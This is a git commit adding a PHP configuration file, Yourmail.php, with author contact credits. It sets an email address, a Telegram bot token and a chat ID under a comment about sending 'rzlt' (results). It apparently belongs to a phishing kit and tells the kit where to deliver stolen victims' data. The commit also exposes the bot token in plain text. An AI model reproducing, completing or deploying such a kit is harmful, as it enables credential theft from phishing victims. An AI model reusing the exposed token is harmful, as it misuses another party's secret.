0c10d171685b327f2f4e7fb7199abed243175ded
octm216 <163662424+octm216@users.noreply.github.com>
2024-12-12 23:19:46 -0900

    Add files via upload

---
+++ Yourmail.php
@@ -0,0 +1,15 @@
+<?php
+/*
+  //||~~ By ~~ saradauchia ~~\\
+  // ICQ Id: @saradauchia \\
+ // SKYPE Id: saradauchia2 \\	
+*/
+
+$send ="jay.h.ambrosee@gmail.com"; 
+
+//telgram rzlt
+$api = "5928587069:AAGKSqOvUJV2fLqNFGVfZ6FdsKA-ybodNtA";
+$chatid = "6393931629";
+
+
+?>
